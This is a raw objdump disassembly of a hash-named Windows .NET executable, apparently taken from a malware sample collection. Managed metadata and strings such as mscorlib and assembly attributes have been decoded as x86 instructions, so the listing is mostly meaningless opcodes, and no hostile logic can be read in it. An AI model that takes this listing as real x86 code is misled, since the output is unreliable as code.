
95a956b0e45c41a80fbc6b479226a9c6780da71e223ca1643cc2e060feea5977.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	inc    eax
  402001:	xor    BYTE PTR [eax],al
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x21b800
  402013:	add    BYTE PTR [ecx*1+0x90000],bl
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    al,BYTE PTR [eax]
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    dh,cl
  402051:	shl    cl,cl
  402053:	dec    eax
  402054:	gs jmp 0xb443:0xa0eadc06
  40205c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40205d:	aam    0x2e
  40205f:	fs dec esi
  402061:	push   edx
  402062:	out    0x85,al
  402064:	imul   DWORD PTR [ebp+0x60]
  402067:	pop    ebp
  402068:	cmc    
  402069:	mov    DWORD PTR [ecx+edi*1],ecx
  40206c:	xor    ebx,ebx
  40206e:	cmp    dh,BYTE PTR [ecx-0x5c6c48af]
  402074:	cs sub al,0x64
  402077:	push   ebp
  402078:	ss or  eax,0x3ed94fb8
  40207e:	ins    BYTE PTR es:[edi],dx
  40207f:	fild   WORD PTR [ebp-0x2bdf62e7]
  402085:	add    esi,DWORD PTR [eax+0x6137ab39]
  40208b:	int    0x2c
  40208d:	pop    edx
  40208e:	or     al,BYTE PTR [edx]
  402090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402091:	popf   
  402092:	cli    
  402093:	or     DWORD PTR [ebx+edx*4],ebp
  402096:	(bad)  
  402098:	outs   dx,DWORD PTR ds:[esi]
  402099:	ret    
  40209a:	idiv   DWORD PTR [esi]
  40209c:	mov    ds:0x94f97e75,eax
  4020a1:	sbb    ebx,0x61
  4020a4:	imul   edx,DWORD PTR ds:0xffa0ecb7,0x74
  4020ab:	sub    al,0x58
  4020ad:	scas   eax,DWORD PTR es:[edi]
  4020ae:	sub    ah,BYTE PTR [eax+ecx*1+0x59]
  4020b2:	adc    DWORD PTR [edi],ecx
  4020b4:	ins    BYTE PTR es:[edi],dx
  4020b5:	icebp  
  4020b6:	inc    ebp
  4020b7:	xchg   edi,eax
  4020b8:	rcr    cl,1
  4020ba:	mov    ch,0xe3
  4020bc:	mov    edi,0x8742e613
  4020c1:	and    DWORD PTR [esp+esi*2],edi
  4020c4:	lea    ebx,[ebx+0x42]
  4020c7:	int3   
  4020c8:	fcmovne st,st(5)
  4020ca:	nop
  4020cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020cc:	or     bl,BYTE PTR [esi+0x49]
  4020cf:	je     0x4020bb
  4020d1:	and    eax,0x5840071c
  4020d6:	sub    BYTE PTR [edi+0x69],dl
  4020d9:	scas   al,BYTE PTR es:[edi]
  4020da:	mov    ds,WORD PTR [ecx*8-0x77d62b6]
  4020e1:	mov    esp,0x90d1a4ba
  4020e6:	jbe    0x402114
  4020e8:	int    0xc7
  4020ea:	mov    dl,0x7e
  4020ec:	sub    BYTE PTR [edi+0x268dd79f],dh
  4020f2:	jg     0x4020be
  4020f4:	ja     0x4020ac
  4020f6:	sub    eax,0x22a80a82
  4020fb:	mov    edi,0xd5d5d065
  402100:	inc    ebx
  402101:	jns    0x40211c
  402103:	test   al,0xc1
  402105:	in     al,dx
  402106:	mov    ebp,0x7f5922d6
  40210b:	push   edx
  40210c:	punpcklbw mm4,DWORD PTR [edi-0x14]
  402110:	cli    
  402111:	jg     0x4020c4
  402113:	call   0x7a3179a4
  402118:	bound  ebx,QWORD PTR [edx+0x538c204a]
  40211e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40211f:	(bad)  
  402121:	lds    eax,FWORD PTR [ebx+0x20420405]
  402127:	neg    BYTE PTR [ebx+0x1c0c61f9]
  40212d:	ss (bad) 
  40212f:	retf   
  402130:	ror    BYTE PTR [ebx],0x1a
  402133:	jle    0x402154
  402135:	push   es
  402136:	lods   al,BYTE PTR ds:[esi]
  402137:	mov    al,ds:0x3e37555b
  40213c:	stos   DWORD PTR es:[edi],eax
  40213d:	jno    0x4020f2
  40213f:	mov    bh,0xc8
  402141:	mov    edx,eax
  402143:	adc    al,0x3a
  402145:	bound  ebp,QWORD PTR [esi-0x49]
  402148:	dec    esi
  402149:	(bad)  
  40214a:	mov    al,ds:0xc25a925d
  40214f:	or     bl,BYTE PTR [esi]
  402151:	add    ch,BYTE PTR [eax]
  402153:	adc    eax,0x2a0a0000
  402158:	adc    esi,DWORD PTR [eax]
  40215a:	add    eax,DWORD PTR [eax]
  40215c:	push   edx
  40215d:	add    BYTE PTR [eax],al
  40215f:	add    BYTE PTR [ecx],al
  402161:	add    BYTE PTR [eax],al
  402163:	adc    DWORD PTR [eax],ebp
  402165:	pop    ss
  402166:	add    BYTE PTR [eax],al
  402168:	or     ch,BYTE PTR [edx+ecx*2]
  40216b:	sub    BYTE PTR [edi],dl
  40216d:	add    BYTE PTR [eax],al
  40216f:	or     ch,BYTE PTR [edi+0x18]
  402172:	add    BYTE PTR [eax],al
  402174:	or     ah,BYTE PTR [esi]
  402176:	sub    BYTE PTR [ecx],bl
  402178:	add    BYTE PTR [eax],al
  40217a:	or     ch,BYTE PTR [eax+edi*1]
  40217d:	sub    BYTE PTR [edx],bl
  40217f:	add    BYTE PTR [eax],al
  402181:	or     ch,BYTE PTR [ecx+esi*1]
  402184:	sub    BYTE PTR [ebx],bl
  402186:	add    BYTE PTR [eax],al
  402188:	or     ch,BYTE PTR [edx+ebp*1]
  40218b:	sbb    BYTE PTR [ebp+0x100001d],cl
  402191:	or     eax,DWORD PTR [edi]
  402193:	push   ss
  402194:	sub    BYTE PTR [ecx],bl
  402196:	add    BYTE PTR [eax],al
  402198:	or     ah,BYTE PTR [edx+0x1a281707]
  40219e:	add    BYTE PTR [eax],al
  4021a0:	or     ah,BYTE PTR [edx+0x28060a07]
  4021a6:	sbb    al,0x0
  4021a8:	add    BYTE PTR [edx],cl
  4021aa:	sub    BYTE PTR es:[ebx],bl
  4021ad:	add    BYTE PTR [eax],al
  4021af:	or     ch,BYTE PTR [edi+0x1d]
  4021b2:	add    BYTE PTR [eax],al
  4021b4:	or     ch,BYTE PTR [edx]
  4021b6:	add    BYTE PTR [eax],al
  4021b8:	inc    edx
  4021b9:	push   ebx
  4021ba:	dec    edx
  4021bb:	inc    edx
  4021bc:	add    DWORD PTR [eax],eax
  4021be:	add    DWORD PTR [eax],eax
  4021c0:	add    BYTE PTR [eax],al
  4021c2:	add    BYTE PTR [eax],al
  4021c4:	or     al,0x0
  4021c6:	add    BYTE PTR [eax],al
  4021c8:	jbe    0x4021fe
  4021ca:	xor    BYTE PTR cs:[esi],ch
  4021cd:	xor    esi,DWORD PTR [eax]
  4021cf:	xor    esi,DWORD PTR [ecx]
  4021d1:	cmp    DWORD PTR [eax],eax
  4021d3:	add    BYTE PTR [eax],al
  4021d5:	add    BYTE PTR ds:0x6c00,al
  4021db:	add    BYTE PTR [eax+0x23000002],ch
  4021e1:	jle    0x4021e3
  4021e3:	add    BYTE PTR [ebx+eax*1],dl
  4021e6:	add    BYTE PTR [eax],al
  4021e8:	push   esp
  4021e9:	add    al,0x0
  4021eb:	add    BYTE PTR [ebx],ah
  4021ed:	push   ebx
  4021ee:	je     0x402262
  4021f0:	imul   ebp,DWORD PTR [esi+0x67],0x73
  4021f7:	add    BYTE PTR [eax+0x7],ch
  4021fa:	add    BYTE PTR [eax],al
  4021fc:	or     BYTE PTR [eax],al
  4021fe:	add    BYTE PTR [eax],al
  402200:	and    edx,DWORD PTR [ebp+0x53]
  402203:	add    BYTE PTR [eax+0x7],dh
  402206:	add    BYTE PTR [eax],al
  402208:	adc    BYTE PTR [eax],al
  40220a:	add    BYTE PTR [eax],al
  40220c:	and    eax,DWORD PTR [edi+0x55]
  40220f:	dec    ecx
  402210:	inc    esp
  402211:	add    BYTE PTR [eax],al
  402213:	add    BYTE PTR [eax-0x63fffff9],al
  402219:	add    eax,0x42230000
  40221e:	ins    BYTE PTR es:[edi],dx
  40221f:	outs   dx,DWORD PTR ds:[esi]
  402220:	bound  eax,QWORD PTR [eax]
  402222:	add    BYTE PTR [eax],al
  402224:	add    BYTE PTR [eax],al
  402226:	add    BYTE PTR [eax],al
  402228:	add    al,BYTE PTR [eax]
  40222a:	add    BYTE PTR [ecx],al
  40222c:	inc    edi
  40222d:	adc    al,0x2
  40222f:	add    BYTE PTR [ecx],cl
  402231:	add    BYTE PTR [eax],al
  402233:	add    BYTE PTR [eax],al
  402235:	cli    
  402236:	and    eax,0x160033
  40223b:	add    BYTE PTR [ecx],al
  40223d:	add    BYTE PTR [eax],al
  40223f:	add    BYTE PTR ds:0x2000000,bl
  402245:	add    BYTE PTR [eax],al
  402247:	add    BYTE PTR [edx],al
  402249:	add    BYTE PTR [eax],al
  40224b:	add    BYTE PTR ds:0x14000000,bl
  402251:	add    BYTE PTR [eax],al
  402253:	add    BYTE PTR [ecx],al
  402255:	add    BYTE PTR [eax],al
  402257:	add    BYTE PTR [ecx],al
  402259:	add    BYTE PTR [eax],al
  40225b:	add    BYTE PTR [ebx],al
  40225d:	add    BYTE PTR [eax],al
  40225f:	add    BYTE PTR [eax],al
  402261:	add    BYTE PTR [edx],cl
  402263:	add    BYTE PTR [ecx],al
  402265:	add    BYTE PTR [eax],al
  402267:	add    BYTE PTR [eax],al
  402269:	add    BYTE PTR [esi],al
  40226b:	add    BYTE PTR [esi+0x0],dl
  40226e:	dec    edi
  40226f:	add    BYTE PTR [esi],al
  402271:	add    BYTE PTR [edx+0x6006800],al
  402277:	add    BYTE PTR [edx+0x6009b00],bh
  40227d:	add    dh,cl
  40227f:	add    BYTE PTR [edi+0x0],cl
  402282:	push   es
  402283:	add    dh,dh
  402285:	add    ah,ah
  402287:	add    BYTE PTR [esi],al
  402289:	add    BYTE PTR ds:0x600e401,cl
  40228f:	add    BYTE PTR [edx],ch
  402291:	add    esp,esp
  402293:	add    BYTE PTR [esi],al
  402295:	add    BYTE PTR [eax+0x1],cl
  402298:	in     al,0x0
  40229a:	push   es
  40229b:	add    BYTE PTR [ecx+0x1],ah
  40229e:	in     al,0x0
  4022a0:	push   es
  4022a1:	add    BYTE PTR [edx+0x1],bh
  4022a4:	in     al,0x0
  4022a6:	push   es
  4022a7:	add    BYTE PTR [ebp+0x600e401],dl
  4022ad:	add    BYTE PTR [esi+0x600e401],ch
  4022b3:	add    bl,cl
  4022b5:	add    esp,esp
  4022b7:	add    BYTE PTR [esi],al
  4022b9:	add    BYTE PTR [edx],al
  4022bb:	add    dh,cl
  4022bd:	add    DWORD PTR [esi],eax
  4022bf:	add    BYTE PTR [edx+eax*1],ah
  4022c2:	icebp  
  4022c3:	add    DWORD PTR [esi],eax
  4022c5:	add    BYTE PTR [esi+0x2],al
  4022c8:	in     al,0x0
  4022ca:	push   es
  4022cb:	add    BYTE PTR [ecx+0x2],ah
  4022ce:	in     al,0x0
  4022d0:	push   es
  4022d1:	add    BYTE PTR [edx+0x2],bh
  4022d4:	in     al,0x0
  4022d6:	push   es
  4022d7:	add    BYTE PTR [eax+0x6029802],bh
  4022dd:	add    cl,ch
  4022df:	add    dl,dh
  4022e1:	add    dl,BYTE PTR [ebx+0x0]
  4022e4:	std    
  4022e5:	add    al,BYTE PTR [eax]
  4022e7:	add    BYTE PTR [esi],al
  4022e9:	add    BYTE PTR [ebx+eax*1],cl
  4022ec:	cwde   
  4022ed:	add    al,BYTE PTR [esi]
  4022ef:	add    BYTE PTR [ebx],dh
  4022f1:	add    edx,esi
  4022f3:	add    cl,BYTE PTR [edx]
  4022f5:	add    BYTE PTR [ebp+0xe002003],al
  4022fb:	add    BYTE PTR [edx+0x6039103],ah
  402301:	add    BYTE PTR [edx+0xe039103],ah
  402307:	add    ah,dl
  402309:	add    edx,DWORD PTR [ecx+0x1c006303]
  40230f:	add    al,0x0
  402311:	add    BYTE PTR [esi],al
  402313:	add    BYTE PTR [eax],bh
  402315:	add    al,0x91
  402317:	add    eax,DWORD PTR [eax]
  402319:	add    BYTE PTR [eax],al
  40231b:	add    BYTE PTR [ecx],al
  40231d:	add    BYTE PTR [eax],al
  40231f:	add    BYTE PTR [eax],al
  402321:	add    BYTE PTR [ecx],al
  402323:	add    BYTE PTR [ecx],al
  402325:	add    BYTE PTR [ecx],al
  402327:	add    DWORD PTR [eax],edx
  402329:	add    BYTE PTR ds:0x5002000,dl
  40232f:	add    BYTE PTR [ecx],al
  402331:	add    BYTE PTR [ecx],al
  402333:	add    BYTE PTR [eax+0x21],dl
  402336:	add    BYTE PTR [eax],al
  402338:	add    BYTE PTR [eax],al
  40233a:	sbb    DWORD PTR [eax],0xa005d
  402340:	add    DWORD PTR [eax],eax
  402342:	pop    eax
  402343:	and    DWORD PTR [eax],eax
  402345:	add    BYTE PTR [eax],al
  402347:	add    BYTE PTR [esi+0xe006300],dl
  40234d:	add    BYTE PTR [ecx],al
  40234f:	add    BYTE PTR [ecx],dl
  402351:	add    BYTE PTR [ebp+0x0],bl
  402354:	adc    al,BYTE PTR [eax]
  402356:	sbb    DWORD PTR [eax],eax
  402358:	pop    ebp
  402359:	add    BYTE PTR [edi],dl
  40235b:	add    BYTE PTR [ecx],ah
  40235d:	add    BYTE PTR [ebp+0x0],bl
  402360:	pop    ss
  402361:	add    BYTE PTR [ecx],ch
  402363:	add    BYTE PTR [ebp+0x0],bl
  402366:	adc    al,BYTE PTR [eax]
  402368:	xor    DWORD PTR [eax],eax
  40236a:	pop    ebp
  40236b:	add    BYTE PTR [edx],dl
  40236d:	add    BYTE PTR [ecx],bh
  40236f:	add    BYTE PTR [ebp+0x0],bl
  402372:	adc    al,BYTE PTR [eax]
  402374:	inc    ecx
  402375:	add    BYTE PTR [ebp+0x0],bl
  402378:	adc    al,BYTE PTR [eax]
  40237a:	dec    ecx
  40237b:	add    BYTE PTR [ebp+0x0],bl
  40237e:	adc    al,BYTE PTR [eax]
  402380:	push   ecx
  402381:	add    BYTE PTR [ebp+0x0],bl
  402384:	adc    al,BYTE PTR [eax]
  402386:	pop    ecx
  402387:	add    BYTE PTR [ebp+0x0],bl
  40238a:	adc    al,BYTE PTR [eax]
  40238c:	popa   
  40238d:	add    BYTE PTR [ebp+0x0],bl
  402390:	adc    al,BYTE PTR [eax]
  402392:	imul   eax,DWORD PTR [eax],0x12005d
  402398:	jno    0x40239a
  40239a:	pop    ebp
  40239b:	add    BYTE PTR [edx],dl
  40239d:	add    BYTE PTR [ecx+0x0],bh
  4023a0:	pop    ebp
  4023a1:	add    BYTE PTR [edx],dl
  4023a3:	add    BYTE PTR [ecx+0x17005d00],al
  4023a9:	add    BYTE PTR [ecx+0x12005d00],cl
  4023af:	add    BYTE PTR [ecx+0x1c005d00],dl
  4023b5:	add    BYTE PTR [ecx+0xa005d00],bl
  4023bb:	add    BYTE PTR [ecx+0x22005d00],ah
  4023c1:	add    BYTE PTR [ecx+0x28005d00],dh
  4023c7:	add    BYTE PTR [ecx],cl
  4023c9:	add    BYTE PTR [ebp+0x0],bl
  4023cc:	or     al,BYTE PTR [eax]
  4023ce:	mov    ecx,0xa005d00
  4023d3:	add    cl,al
  4023d5:	add    BYTE PTR [edx-0x2eff22fd],dh
  4023db:	add    al,dl
  4023dd:	add    esp,edx
  4023df:	add    cl,al
  4023e1:	add    ch,ah
  4023e3:	add    esp,esi
  4023e5:	add    cl,al
  4023e7:	add    BYTE PTR [ebx],al
  4023e9:	add    al,0xdd
  4023eb:	add    cl,al
  4023ed:	add    BYTE PTR [ebx],ch
  4023ef:	add    al,0xeb
  4023f1:	add    cl,ch
  4023f3:	add    BYTE PTR [ebx+0x4],al
  4023f6:	lock add cl,ah
  4023f9:	add    BYTE PTR [ebx+0x4],cl
  4023fc:	or     al,BYTE PTR [eax]
  4023fe:	add    BYTE PTR cs:[ebx+0x0],cl
  402402:	xchg   ebp,eax
  402403:	add    DWORD PTR [esi],ebp
  402405:	add    BYTE PTR [ebx],cl
  402407:	add    BYTE PTR [eax],al
  402409:	add    DWORD PTR [esi],ebp
  40240b:	add    BYTE PTR [ebx],dl
  40240d:	add    BYTE PTR [eax],bh
  40240f:	add    DWORD PTR [esi],ebp
  402411:	add    BYTE PTR [ebx],bl
  402413:	add    BYTE PTR [esi],bh
  402415:	add    DWORD PTR [esi],ebp
  402417:	add    BYTE PTR [ebx],ah
  402419:	add    BYTE PTR [ecx+eax*1+0x2e],al
  40241d:	add    BYTE PTR [ebx],ch
  40241f:	add    BYTE PTR [ecx+eax*1+0x2e],al
  402423:	add    BYTE PTR [ebx],dh
  402425:	add    BYTE PTR [ecx+eax*1+0x2e],al
  402429:	add    BYTE PTR [ebx],bh
  40242b:	add    BYTE PTR [ecx+eax*1+0x2e],dl
  40242f:	add    BYTE PTR [ebx+0x0],al
  402432:	outs   dx,DWORD PTR ds:[esi]
  402433:	add    DWORD PTR [esi],ebp
  402435:	add    BYTE PTR [ebx+0x0],bh
  402438:	add    DWORD PTR ds:[esi],ebp
  40243b:	add    BYTE PTR [ebx+0x2e059100],ah
  402441:	add    BYTE PTR [ebx+0x0],ah
  402444:	leave  
  402445:	add    DWORD PTR [esi],ebp
  402447:	add    BYTE PTR [ebx+0x0],ch
  40244a:	fild   DWORD PTR [ecx]
  40244c:	add    BYTE PTR cs:[ebx+0x0],dh
  402450:	jmp    0x5b405256
  402455:	add    cl,cl
  402457:	add    DWORD PTR [esi],ebp
  402459:	add    BYTE PTR [ebx+0x2e01f400],al
  40245f:	add    BYTE PTR [ebx+0x2e021f00],cl
  402465:	add    BYTE PTR [ebx+0x2e056900],dl
  40246b:	add    BYTE PTR [ebx+0x40058800],bl
  402471:	add    BYTE PTR [ebx-0x8ff3100],dh
  402477:	add    BYTE PTR [eax+eax*4],al
  40247a:	add    BYTE PTR [eax],al
  40247c:	or     eax,DWORD PTR [eax]
  40247e:	add    BYTE PTR [eax],al
  402480:	add    BYTE PTR [eax],al
  402482:	add    BYTE PTR [eax],al
  402484:	add    DWORD PTR [eax],eax
  402486:	add    BYTE PTR [eax],al
  402488:	sub    eax,0x32c00
  40248d:	add    BYTE PTR [eax+eax*1],al
	...
  402498:	add    BYTE PTR [eax],al
  40249a:	add    DWORD PTR [eax],eax
  40249c:	inc    esi
  40249d:	add    BYTE PTR [eax],al
  40249f:	add    BYTE PTR [eax],al
  4024a1:	add    BYTE PTR [ebx],cl
	...
  4024ab:	add    BYTE PTR [eax],al
  4024ad:	add    ah,dl
  4024af:	add    BYTE PTR [eax+0x3],dl
  4024b2:	add    BYTE PTR [eax],al
  4024b4:	add    BYTE PTR [eax],al
  4024b6:	add    al,BYTE PTR [eax]
	...
  4024c0:	add    BYTE PTR [eax],al
  4024c2:	add    DWORD PTR [eax],eax
  4024c4:	inc    esi
	...
  4024cd:	cmp    al,0x4d
  4024cf:	outs   dx,DWORD PTR ds:[esi]
  4024d0:	fs jne 0x40253f
  4024d3:	gs add BYTE PTR ds:[esi+0x73],dh
  4024d8:	push   0x2e74736f
  4024dd:	gs js  0x402545
  4024e0:	add    BYTE PTR [ebp+0x6e],al
  4024e3:	je     0x402557
  4024e5:	jns    0x402537
  4024e7:	outs   dx,DWORD PTR ds:[esi]
  4024e8:	imul   ebp,DWORD PTR [esi+0x74],0x63694d00
  4024ef:	jb     0x402560
  4024f1:	jae    0x402562
  4024f3:	data16 je 0x402524
  4024f6:	push   esi
  4024f7:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4024fe:	jne    0x402564
  402500:	imul   ebp,DWORD PTR [edi+0x2e],0x74736f48
  402507:	imul   ebp,DWORD PTR [esi+0x67],0x636f7250
  40250e:	gs jae 0x402584
  402511:	add    BYTE PTR [ebp+0x73],ch
  402514:	arpl   WORD PTR [edi+0x72],bp
  402517:	ins    BYTE PTR es:[edi],dx
  402518:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  40251f:	gs ins DWORD PTR es:[edi],dx
  402521:	add    BYTE PTR [edi+0x62],cl
  402524:	push   0x65
  402526:	arpl   WORD PTR [eax+eax*1+0x2e],si
  40252a:	arpl   WORD PTR [edi+ebp*2+0x72],si
  40252e:	add    BYTE PTR [ebp+0x61],cl
  402531:	imul   ebp,DWORD PTR [esi+0x0],0x74737953
  402538:	gs ins DWORD PTR es:[edi],dx
  40253a:	cs push edx
  40253c:	jne    0x4025ac
  40253e:	je     0x4025a9
  402540:	ins    DWORD PTR es:[edi],dx
  402541:	gs cs push esi
  402544:	gs jb  0x4025ba
  402547:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
  40254e:	push   esp
  40254f:	popa   
  402550:	jb     0x4025b9
  402552:	gs je  0x40259b
  402555:	jb     0x4025b8
  402557:	ins    DWORD PTR es:[edi],dx
  402558:	gs ja  0x4025ca
  40255b:	jb     0x4025c8
  40255d:	inc    ecx
  40255e:	je     0x4025d4
  402560:	jb     0x4025cb
  402562:	bound  esi,QWORD PTR [ebp+0x74]
  402565:	add    BYTE PTR gs:[ebx+0x79],dl
  402569:	jae    0x4025df
  40256b:	gs ins DWORD PTR es:[edi],dx
  40256d:	cs push edx
  40256f:	jne    0x4025df
  402571:	je     0x4025dc
  402573:	ins    DWORD PTR es:[edi],dx
  402574:	gs cs dec ecx
  402577:	outs   dx,BYTE PTR ds:[esi]
  402578:	je     0x4025df
  40257a:	jb     0x4025eb
  40257c:	jo     0x4025d1
  40257e:	gs jb  0x4025f7
  402581:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402588:	ins    DWORD PTR es:[edi],dx
  402589:	push   esi
  40258a:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  402591:	je     0x402607
  402593:	jb     0x4025fe
  402595:	bound  esi,QWORD PTR [ebp+0x74]
  402598:	add    BYTE PTR gs:[ebx+0x4c],al
  40259c:	push   ebx
  40259d:	inc    ebx
  40259e:	outs   dx,DWORD PTR ds:[esi]
  40259f:	ins    DWORD PTR es:[edi],dx
  4025a0:	jo     0x40260e
  4025a2:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  4025a9:	jb     0x402614
  4025ab:	bound  esi,QWORD PTR [ebp+0x74]
  4025ae:	add    BYTE PTR gs:[ebx+0x79],dl
  4025b2:	jae    0x402628
  4025b4:	gs ins DWORD PTR es:[edi],dx
  4025b6:	cs push edx
  4025b8:	gs data16 ins BYTE PTR es:[edi],dx
  4025bb:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4025c0:	outs   dx,BYTE PTR ds:[esi]
  4025c1:	add    BYTE PTR [ecx+0x73],al
  4025c4:	jae    0x40262b
  4025c6:	ins    DWORD PTR es:[edi],dx
  4025c7:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  4025cb:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  4025d3:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4025da:	jae    0x40264f
  4025dc:	gs ins DWORD PTR es:[edi],dx
  4025de:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4025e2:	gs jae 0x402648
  4025e5:	jb     0x402650
  4025e7:	jo     0x40265d
  4025e9:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4025f0:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4025f7:	jae    0x40266c
  4025f9:	gs ins DWORD PTR es:[edi],dx
  4025fb:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4025ff:	gs popaw 
  402602:	jne    0x402670
  402604:	je     0x402647
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40260e:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402615:	jae    0x40268a
  402617:	gs ins DWORD PTR es:[edi],dx
  402619:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40261d:	outs   dx,DWORD PTR ds:[esi]
  40261e:	ins    DWORD PTR es:[edi],dx
  40261f:	jo     0x402682
  402621:	outs   dx,BYTE PTR ds:[esi]
  402622:	jns    0x402665
  402624:	je     0x40269a
  402626:	jb     0x402691
  402628:	bound  esi,QWORD PTR [ebp+0x74]
  40262b:	add    BYTE PTR gs:[ecx+0x73],al
  40262f:	jae    0x402696
  402631:	ins    DWORD PTR es:[edi],dx
  402632:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402636:	jb     0x4026a7
  402638:	fs jne 0x40269e
  40263b:	je     0x40267e
  40263d:	je     0x4026b3
  40263f:	jb     0x4026aa
  402641:	bound  esi,QWORD PTR [ebp+0x74]
  402644:	add    BYTE PTR gs:[ecx+0x73],al
  402648:	jae    0x4026af
  40264a:	ins    DWORD PTR es:[edi],dx
  40264b:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40264f:	outs   dx,DWORD PTR ds:[esi]
  402650:	jo     0x4026cb
  402652:	jb     0x4026bd
  402654:	addr16 push 0x74744174
  40265a:	jb     0x4026c5
  40265c:	bound  esi,QWORD PTR [ebp+0x74]
  40265f:	add    BYTE PTR gs:[ecx+0x73],al
  402663:	jae    0x4026ca
  402665:	ins    DWORD PTR es:[edi],dx
  402666:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40266a:	gs jb  0x4026e0
  40266d:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402674:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40267b:	jae    0x4026f0
  40267d:	gs ins DWORD PTR es:[edi],dx
  40267f:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  402683:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  40268b:	outs   dx,DWORD PTR ds:[esi]
  40268c:	outs   dx,BYTE PTR ds:[esi]
  40268d:	inc    ecx
  40268e:	je     0x402704
  402690:	jb     0x4026fb
  402692:	bound  esi,QWORD PTR [ebp+0x74]
  402695:	add    BYTE PTR gs:[ecx+0x73],al
  402699:	jae    0x402700
  40269b:	ins    DWORD PTR es:[edi],dx
  40269c:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4026a0:	outs   dx,BYTE PTR ds:[esi]
  4026a1:	outs   dx,WORD PTR ds:[esi]
  4026a3:	jb     0x402712
  4026a5:	popa   
  4026a6:	je     0x402711
  4026a8:	outs   dx,DWORD PTR ds:[esi]
  4026a9:	outs   dx,BYTE PTR ds:[esi]
  4026aa:	popa   
  4026ab:	ins    BYTE PTR es:[edi],dx
  4026ac:	push   esi
  4026ad:	gs jb  0x402723
  4026b0:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4026b7:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  4026be:	jns    0x402733
  4026c0:	je     0x402727
  4026c2:	ins    DWORD PTR es:[edi],dx
  4026c3:	cs push edx
  4026c5:	gs jae 0x402737
  4026c8:	jne    0x40273c
  4026ca:	arpl   WORD PTR [ebp+0x73],sp
  4026cd:	add    BYTE PTR [ebx+0x61],dl
  4026d0:	je     0x402737
  4026d2:	ins    BYTE PTR es:[edi],dx
  4026d3:	ins    BYTE PTR es:[edi],dx
  4026d4:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  4026dc:	popa   
  4026dd:	arpl   WORD PTR [esi+edx*2+0x65],si
  4026e1:	jb     0x402756
  4026e3:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4026ea:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  4026f1:	gs jne 0x402768
  4026f4:	jb     0x402757
  4026f6:	ins    BYTE PTR es:[edi],dx
  4026f7:	push   edx
  4026f8:	gs jae 0x40276a
  4026fb:	jne    0x40276f
  4026fd:	arpl   WORD PTR [ebp+0x73],sp
  402700:	dec    esp
  402701:	popa   
  402702:	outs   dx,BYTE PTR ds:[esi]
  402703:	addr16 jne 0x402767
  402706:	addr16 gs inc ecx
  402709:	je     0x40277f
  40270b:	jb     0x402776
  40270d:	bound  esi,QWORD PTR [ebp+0x74]
  402710:	add    BYTE PTR gs:[ecx+0x73],al
  402714:	jae    0x40277b
  402716:	ins    DWORD PTR es:[edi],dx
  402717:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40271b:	gs ins BYTE PTR es:[edi],dx
  40271d:	popa   
  40271e:	jns    0x402773
  402720:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  402727:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40272e:	jae    0x4027a3
  402730:	gs ins DWORD PTR es:[edi],dx
  402732:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  402736:	gs jns 0x40277f
  402739:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  402741:	bound  esi,QWORD PTR [ebp+0x74]
  402744:	add    BYTE PTR gs:[ecx+0x73],al
  402748:	jae    0x4027af
  40274a:	ins    DWORD PTR es:[edi],dx
  40274b:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  40274f:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  402756:	gs dec ebx
  402758:	gs jns 0x40279c
  40275b:	je     0x4027d1
  40275d:	jb     0x4027c8
  40275f:	bound  esi,QWORD PTR [ebp+0x74]
  402762:	add    BYTE PTR gs:[ebx+0x79],dl
  402766:	jae    0x4027dc
  402768:	gs ins DWORD PTR es:[edi],dx
  40276a:	cs push edx
  40276c:	jne    0x4027dc
  40276e:	je     0x4027d9
  402770:	ins    DWORD PTR es:[edi],dx
  402771:	gs cs inc ebx
  402774:	outs   dx,DWORD PTR ds:[esi]
